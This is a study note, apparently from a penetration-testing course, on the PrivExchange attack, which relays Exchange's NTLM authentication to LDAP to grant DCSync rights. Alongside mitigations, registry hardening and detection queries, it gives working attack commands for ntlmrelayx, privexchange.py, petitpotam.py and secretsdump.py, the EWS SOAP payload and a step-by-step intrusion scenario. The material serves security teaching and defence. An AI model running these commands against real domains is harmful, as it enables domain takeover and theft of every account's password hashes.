---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.07 PrivExchange - Exchange to Domain Admin"
---

# PrivExchange: Exchange to Domain Admin

## 1. Introduction to PrivExchange

"PrivExchange" is a critical escalation path discovered by security researcher Dirk-jan Mollema in early 2019. It leverages the inherent high privileges of Microsoft Exchange within Active Directory combined with NTLM relaying techniques. It allows an attacker with any valid domain user credentials (specifically, one with a mailbox) to escalate to Domain Admin privileges almost instantly.

The attack exploits the `PushSubscription` feature of Exchange Web Services (EWS). By forcing the Exchange server to authenticate to an attacker-controlled machine, the attacker can relay the Exchange server's high-privileged machine account NTLM credentials to a Domain Controller via LDAP. This relayed session is then used to grant the attacker's account DCSync rights, leading to full domain compromise.

While largely mitigated in modern, patched environments through cumulative updates (which removed high privileges) and hardened Active Directory configurations (SMB/LDAP signing), PrivExchange remains a textbook example of the dangers of default excessive permissions, NTLM relaying vulnerabilities, and complex service interdependencies.

## 2. Vulnerability Background and Root Causes

The core of the PrivExchange vulnerability lies in two primary architectural decisions historically made by Microsoft regarding Exchange Server deployments:

1. **Excessive Default Permissions**: By default, in older Exchange deployments (Exchange 2013, 2016, and early 2019), and those migrated without proper permission cleanup, the `Exchange Windows Permissions` group possessed `WriteDacl` rights over the domain root object. This meant that any member of this group—which included all Exchange Server machine accounts (e.g., `EXCHANGE$`)—could modify the Access Control Lists (ACLs) of the domain itself.
2. **EWS PushSubscriptions API**: Exchange Web Services (EWS) provides an API endpoint that clients can use to subscribe to push notifications. When a client subscribes to specific mailbox events (like receiving a new email), Exchange sends an HTTP POST request to a provided callback URL whenever an event occurs. Crucially, Exchange authenticates this HTTP POST request using its own machine account (`EXCHANGE$`) via NTLM over HTTP.

By combining these two factors, an attacker can coerce the Exchange server to send an NTLM authentication request to the attacker's IP, and then relay that request to the Domain Controller to abuse the `WriteDacl` privilege.

## 3. Architecture Overview and Attack Flow

The following ASCII diagram illustrates the sequence of events during a full PrivExchange attack, from initial EWS connection to final DCSync.

```text
+---------------------------------------------------------------------------------------------------+
|                                       PrivExchange Attack Flow                                    |
+---------------------------------------------------------------------------------------------------+
|                                                                                                   |
|  [ Attacker Machine (Kali) ]                                                                      |
|  (Running ntlmrelayx.py)                                                                          |
|           |                                                                                       |
|           | 1. Connects to EWS (/EWS/Exchange.asmx), sets PushSubscription URL to Attacker IP     |
|           |    (Requires any valid user credentials with a mailbox)                               |
|           v                                                                                       |
|  [ Microsoft Exchange Server (EXCHANGE$) ]                                                        |
|           |                                                                                       |
|           | 2. EWS Event Triggers immediately upon subscription.                                  |
|           |    Exchange connects to Attacker URL via HTTP POST.                                   |
|           |    Authenticates as 'DOMAIN\EXCHANGE$' using NTLM over HTTP.                          |
|           v                                                                                       |
|  [ Attacker Machine (ntlmrelayx) ]                                                                |
|           |                                                                                       |
|           | 3. Extracts NTLM Challenge/Response.                                                  |
|           |    Relays NTLM Authentication via LDAP (Port 389) or LDAPS (Port 636)                 |
|           v                                                                                       |
|  [ Domain Controller ]                                                                            |
|           |                                                                                       |
|           | 4. DC accepts relayed EXCHANGE$ authentication.                                       |
|           |    Attacker issues LDAP modify request altering the Domain Root Security Descriptor.  |
|           v                                                                                       |
|  [ Active Directory Database (NTDS.dit) ]                                                         |
|           |                                                                                       |
|           | 5. Grants Attacker Account 'DS-Replication-Get-Changes' (DCSync rights).              |
|           v                                                                                       |
|  [ Attacker Machine ]                                                                             |
|           |                                                                                       |
|           | 6. Performs DCSync (secretsdump.py) to extract krbtgt and Administrator hashes.       |
|           v                                                                                       |
|      FULL DOMAIN COMPROMISE (Domain Admin)                                                        |
|                                                                                                   |
+---------------------------------------------------------------------------------------------------+
```

## 4. Deep Dive: Step-by-Step Exploitation

The attack involves two primary tools from the Impacket suite: `privexchange.py` (to trigger the authentication) and `ntlmrelayx.py` (to catch and relay it).

### Step 1: Set up the NTLM Relay

First, the attacker configures `ntlmrelayx.py` to listen for incoming HTTP connections and relay them to the Domain Controller's LDAP service. The goal is to escalate privileges for a specific user (e.g., the attacker's compromised low-privileged account).

```bash
# Set up ntlmrelayx to relay to DC over LDAP and grant DCSync rights to 'attacker_user'
sudo ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user attacker_user
```

If LDAP signing is enforced but LDAPS is available, the attacker can relay to LDAPS, which historically did not enforce channel binding by default in older environments.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.10 --escalate-user attacker_user
```

### Step 2: Trigger the EWS PushSubscription

Next, the attacker uses the `privexchange.py` script to connect to the Exchange Server. This script crafts a specific SOAP XML payload and sends it to the `/EWS/Exchange.asmx` endpoint.

```bash
# Trigger the EWS connection. 
# -ah: Attacker Host (listening IP)
# -u: User with a mailbox
# -p: Password
# -d: Domain
python3 privexchange.py -ah 10.10.10.100 10.10.10.20 -u attacker_user -p 'Password123!' -d domain.local
```

**The underlying SOAP XML payload looks something like this:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:Subscribe>
      <m:PushSubscriptionRequest>
        <t:FolderIds>
          <t:DistinguishedFolderId Id="inbox" />
        </t:FolderIds>
        <t:EventTypes>
          <t:EventType>NewMailEvent</t:EventType>
        </t:EventTypes>
        <t:StatusFrequency>1</t:StatusFrequency>
        <t:URL>http://10.10.10.100/</t:URL> <!-- ATTACKER IP -->
      </m:PushSubscriptionRequest>
    </m:Subscribe>
  </soap:Body>
</soap:Envelope>
```

### Step 3: NTLM Relaying to LDAP

Once `privexchange.py` sends the payload, the Exchange server attempts to send a status notification to `http://10.10.10.100/`. It attempts to authenticate using the `EXCHANGE$` machine account credentials via NTLM.

`ntlmrelayx` intercepts this HTTP request. Because the incoming connection is HTTP, there is no SMB signing to worry about. `ntlmrelayx` passes the NTLM challenge-response between the Exchange Server and the Domain Controller's LDAP service.

Since the `EXCHANGE$` account is part of the `Exchange Windows Permissions` group, it possesses `WriteDacl` permissions over the domain root. `ntlmrelayx` automatically executes an LDAP modifying request that adds two specific Extended Rights to the target user (`attacker_user`):
- `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-All` (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

These are the exact permissions required to perform DCSync.

### Step 4: Escalation to Domain Admin (DCSync)

With DCSync rights successfully delegated to `attacker_user`, the attacker can now extract the password hashes of any user in the domain, including Domain Admins and the `krbtgt` account, without needing to execute code on the Domain Controller.

```bash
# Execute DCSync using secretsdump.py
secretsdump.py domain.local/attacker_user:'Password123!'@10.10.10.10
```

This dumps the NTDS.dit contents over the network via the DRSUAPI RPC interface. The attacker now has full control of the domain and can forge Golden Tickets.

## 5. Alternative Triggers: PetitPotam and PrinterBug

While PrivExchange specifically refers to abusing EWS PushSubscriptions, the underlying principle—relaying an Exchange server's authentication to LDAP—can be triggered via other coercion methods.

If EWS is disabled or patched, an attacker might use **SpoolSample (PrinterBug)** or **PetitPotam** to coerce the Exchange server to authenticate over SMB or HTTP.

- **PetitPotam against Exchange**:
  ```bash
  python3 petitpotam.py 10.10.10.100 10.10.10.20
  ```
  If relayed over HTTP to WebDAV or directly over RPC/SMB, it might still yield the machine account hash. Note that relaying SMB to LDAP is prevented by modern Windows protections (NTLM relaying cross-protocol restrictions without the Message Integrity Code (MIC) drop, which is patched), but triggering HTTP via WebClient is still highly viable.

## 6. Comprehensive Mitigations

Microsoft addressed PrivExchange in multiple layers:

1. **Exchange Cumulative Updates (CU)**: Microsoft released updates that removed the excessive privileges of the `Exchange Windows Permissions` group. The Exchange servers no longer require or possess `WriteDacl` on the domain object by default.
2. **Enabling LDAP Signing and LDAP Channel Binding**: By enforcing LDAP signing (`RequireSignature = 1`) and Channel Binding Tokens (CBT) for LDAPS on Domain Controllers, relaying NTLM to LDAP is categorically blocked. The relayed authentication will be rejected because the relaying attacker cannot sign the LDAP payload.
3. **Removing Dead Privileges**: Administrators should manually inspect the domain root ACLs and remove `WriteDacl` from the `Exchange Windows Permissions` group if it remains as a vestige of an old installation.
4. **Disabling NTLM**: Transitioning to Kerberos-only environments prevents all NTLM relay attacks.
5. **EWS Modifications**: Microsoft altered how EWS authenticates push notifications, preventing it from automatically using the machine account over NTLM.

### Registry Fix for LDAP Enforcements

On Domain Controllers, configure the following:
```powershell
# Enforce LDAP Channel Binding
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name "LdapEnforceChannelBinding" -Value 2

# Enforce LDAP Signing
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 2
```

## 7. Advanced Detections

Detecting PrivExchange requires correlating network activity with directory service modifications.

### Network and Host Detections
- Monitor for HTTP requests from Exchange Servers to unusual or non-corporate internal IP addresses, specifically looking for `POST` requests originating from the `w3wp.exe` process handling EWS.
- Alert on NTLM authentication originating from an Exchange server machine account (`EXCHANGE$`) directed at a Domain Controller over LDAP (port 389) or LDAPS (port 636) instead of standard DC-to-DC or AD-DS traffic.

### Event Log Detections (Sysmon & Security Logs)

- **Event ID 5136 (Directory Service Changes)**: Monitor for modifications to the `nTSecurityDescriptor` attribute of the domain root object (`DC=domain,DC=local`). Look for the sudden addition of the `DS-Replication-Get-Changes` GUIDs.
- **Event ID 4662 (Operation was performed on an object)**: Monitor for DCSync activity. Alert when a user account that is not a Domain Controller machine account or known Azure AD Connect account requests the `DS-Replication-Get-Changes-All` extended right.

### KQL Query for DCSync Activity

```kusto
SecurityEvent
| where EventID == 4662
| where ObjectServer == "DS"
| where Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" // DS-Replication-Get-Changes-All
| where SubjectUserName !endswith "$" // Exclude legitimate machine accounts (DCs)
| project TimeGenerated, SubjectUserName, SubjectDomainName, ObjectName, AccessMask, Properties
```

## 8. Chaining Opportunities

- **[[15 - Coercion Techniques (PetitPotam, ShadowCoerce)]]**: Use alternative coercion techniques if EWS is secured, to force the Exchange server to authenticate.
- **[[06 - Pass-the-Certificate in Hybrid Environments]]**: If DCSync is achieved, extract the AD CS keys or Azure AD Connect sync accounts to pivot into the Entra ID tenant.
- **[[08 - ProxyLogon Chaining]]**: Use RCE on Exchange to dump memory, bypass coercion entirely, and act directly as the `EXCHANGE$` account.
- **[[14 - Advanced LDAP Exploitation]]**: Explore further what `WriteDacl` can accomplish besides DCSync, such as Resource-Based Constrained Delegation (RBCD).

## 9. Related Notes

- [[02 - NTLM Relaying Deep Dive]]
- [[11 - DCSync and DCShadow Attacks]]
- [[16 - Active Directory Access Control Lists (ACLs)]]
- [[20 - Exchange Architecture and Internals]]

## Real-World Attack Scenario
## Real-World Attack Scenario: The PrivExchange Escalation

**The Context:** An attacker has compromised a low-privileged Active Directory account (`j.doe`) belonging to an intern in a mid-sized healthcare organization. The network relies on an older on-premises Exchange 2016 deployment that hasn't had its permissions hardened. The attacker wants to escalate to Domain Admin but is blocked by strict EDR policies on the internal endpoints that prevent credential dumping.

**The Reconnaissance:** 
The attacker runs PowerView to enumerate domain permissions and discovers that the `Exchange Windows Permissions` group, which includes the `EXCHANGE01$` machine account, still retains `WriteDacl` rights over the domain root object. This is the classic misconfiguration required for a PrivExchange attack.

**The Execution:**
1. **Setting the Trap:** On their internal attack pivot machine, the attacker starts `ntlmrelayx.py`, configuring it to listen for HTTP connections and relay them to the primary Domain Controller via LDAP. They set the `--escalate-user j.doe` flag.
2. **Coercing Authentication:** The attacker executes `privexchange.py`, providing `j.doe`'s credentials. The script connects to the Exchange Web Services (EWS) API and subscribes to a push notification, supplying the attacker’s IP address as the callback URL.
3. **The Relay:** Exchange immediately triggers the notification, sending an HTTP POST request to the attacker's machine and authenticating as `EXCHANGE01$` via NTLM.
4. **ACL Modification:** `ntlmrelayx` intercepts the NTLM challenge-response and relays it to the Domain Controller over LDAP. Because `EXCHANGE01$` has `WriteDacl` rights, the relayed session successfully modifies the domain's Security Descriptor, explicitly granting `j.doe` the `DS-Replication-Get-Changes-All` privilege.
5. **DCSync:** The attacker stops the relay and immediately runs Impacket's `secretsdump.py` using `j.doe`'s credentials.

**The Outcome:**
Despite starting as a mere intern, the attacker exploited the complex service interdependencies between Exchange and Active Directory. By leveraging EWS to coerce an NTLM authentication and relaying it to LDAP, they dynamically granted their low-level account DCSync rights. They dumped the entire NTDS.dit, including the `krbtgt` hash, achieving total Domain Admin compromise in under two minutes without ever executing malware on a server.

